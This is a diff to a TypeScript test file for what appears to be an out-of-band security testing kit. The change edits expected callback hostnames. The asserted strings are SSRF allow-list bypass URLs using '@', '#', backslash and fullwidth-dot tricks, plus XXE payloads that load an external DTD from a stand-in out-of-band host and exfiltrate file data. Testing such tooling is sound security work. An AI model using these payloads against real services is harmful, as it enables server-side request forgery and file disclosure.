@@ -108,13 +108,13 @@ test("kit: callbacks and bypasses carry their code next to the tag; codes are un
   const cb = callbacks("fetch", H), by = bypasses("fetch", H, "api.shop.example");
   const codes = [...cb, ...by].map((p) => p.code);
   assert.equal(new Set(codes).size, codes.length);
-  assert.equal(cb[0].text, `http://kc1.fetch.${H}/`);
+  assert.equal(cb[0].text, `http://kc1.fetch-${H}/`);
   assert.equal(cb[1].text, `https://fetch-${H}/k/kc2`);
-  assert.equal(cb.find((p) => p.code === "kc6")!.text, `\\\\kc6.fetch.${H}\\k`);
-  assert.equal(by[0].text, `http://api.shop.example@ka1.fetch.${H}/`);
-  assert.equal(by[2].text, `http://ka3.fetch.${H}#@api.shop.example/`);
-  assert.equal(by[4].text, `http://ka5.fetch.${H}\\@api.shop.example/`);
-  assert.equal(by[8].text, `http://ka9。fetch。${H.replace(/\./g, "。")}/`);
+  assert.equal(cb.find((p) => p.code === "kc6")!.text, `\\\\kc6.fetch-${H}\\k`);
+  assert.equal(by[0].text, `http://api.shop.example@ka1.fetch-${H}/`);
+  assert.equal(by[2].text, `http://ka3.fetch-${H}#@api.shop.example/`);
+  assert.equal(by[4].text, `http://ka5.fetch-${H}\\@api.shop.example/`);
+  assert.equal(by[8].text, `http://ka9。fetch-${H.replace(/\./g, "。")}/`);
   for (const p of [...cb, ...by]) assert.match(p.text, /fetch/, p.code);
 });
 
@@ -178,8 +178,8 @@ import { xxeData } from "../src/lib/stage.ts";
 test("xxe: payloads load the DTD over HTTP with their code; the data hit decodes", () => {
   const H = "abcdefghij0123456789klmnopqrstuvw.oob.example";
   const ps = xxePayloads("x1", H);
-  assert.equal(ps[0].text, `<!DOCTYPE x SYSTEM "http://kx1.x1.${H}/x.dtd">`);
-  assert.equal(ps.find((p) => p.code === "kx7")!.text, `http://kx7.x1.${H}/feed.xml`);
+  assert.equal(ps[0].text, `<!DOCTYPE x SYSTEM "http://kx1.x1-${H}/x.dtd">`);
+  assert.equal(ps.find((p) => p.code === "kx7")!.text, `http://kx7.x1-${H}/feed.xml`);
   assert.equal(variantOf({ extraLabels: ["kx0"] })!.name, "File data from the DTD");
   assert.equal(stageOf({ answerPart: "x.dtd" }), "served x.dtd");
   assert.equal(stageOf({ fullId: "kx0.x1.abc", summary: "GET /d?d=user%0A HTTP/1.1" }), "file data: user\\n");
